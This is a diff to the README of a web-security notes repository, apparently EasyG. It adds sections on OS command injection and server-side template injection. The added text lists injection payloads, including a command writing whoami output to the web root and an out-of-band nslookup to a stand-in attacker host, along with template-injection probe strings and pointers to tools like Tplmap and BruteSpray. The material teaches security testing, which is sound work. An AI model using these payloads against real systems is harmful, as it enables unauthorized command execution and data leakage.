@@ -27,7 +27,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [SQL Injection](#sql-injection)
   - [Authentication vulnerabilities](#authentication-vulnerabilities)
   - [Directory Traversal](#directory-traversal)
-  - Command Injection https://github.com/commixproject/commix-testbed
+  - [OS Command Injection](#os-command-injection)
   - [Business logic vulnerabilities](#business-logic-vulnerabilities)
   - [Information Disclosure](#information-disclosure)
   - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
@@ -42,7 +42,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - DOM-based vulnerabilities
   - Websockets
   - [Insecure deserialization](#insecure-deserialization)
-  - Server-side template injection
+  - [Server-side template injection](#server-side-template-injection)
   - Web cache poisoning
   - [HTTP Host header attacks](#http-host-header-attacks)
   - HTTP request smuggling
@@ -263,7 +263,6 @@ Single target
 - [gip](https://github.com/dalance/gip) a command-line tool and Rust library to check global IP address.
 
 **For ulnerabilities**
-- [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
 - [BruteSpray](https://github.com/x90skysn3k/brutespray) `python brutespray.py --file nmap.xml --threads 5 --hosts 5`
 - [SearchSploit](https://github.com/offensive-security/exploitdb#searchsploit) Port services vulnerability checks
 - [CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) CMS Detection & Exploitation Suite
@@ -604,6 +603,33 @@ xp_cmdshell 'COMMAND';
 
 
 
+### <ins>OS Command Injection</ins>
+
+Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.
+
+For blind OS Command Injections
+- Time delay `& ping -c 10 127.0.0.1 &`
+- Redirecting output `& whoami > /var/www/static/whoami.txt &`
+- Out-of-band (OAST) techniques `& nslookup kgji2ohoyw.web-attacker.com &`
+
+Ways of injecting OS commands
+- Both Windows and Unix-based systems
+  - `&`
+  - `&&`
+  - `|`
+  - `||`
+- Unix-based systems only
+  - `;`
+  - Newline with `0x0a` or `\n`
+  - `injected command`
+  - `$(injected command)`
+
+**Resource**
+- [commix-testbed](https://github.com/commixproject/commix-testbed)
+
+
+
+
 ### <ins>Business logic vulnerabilities</ins>
 
 **Examples**
@@ -937,6 +963,28 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
 
 
 
+### <ins>Server-side template injection</ins>
+
+- Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
+- The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
+- Use payloads like these
+  ```
+  {{2*2}}[[3*3]]
+  {{3*3}}
+  {{3*'3'}}
+  <%= 3 * 3 %>
+  ${6*6}
+  ${{3*3}}
+  @(6+5)
+  #{3*3}
+  #{ 3 * 3 }
+  ```
+
+**Resource**
+- [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
+
+
+
 ### <ins>HTTP Host header attacks</ins>
 
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
@@ -947,7 +995,7 @@ curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Refere
 
 ### <ins>JWT Attacks</ins>
 
-**Resources**
+**Resource**
 - [{JWT}.{Attack}.Playbook](https://github.com/ticarpi/jwt_tool/wiki)
 
 
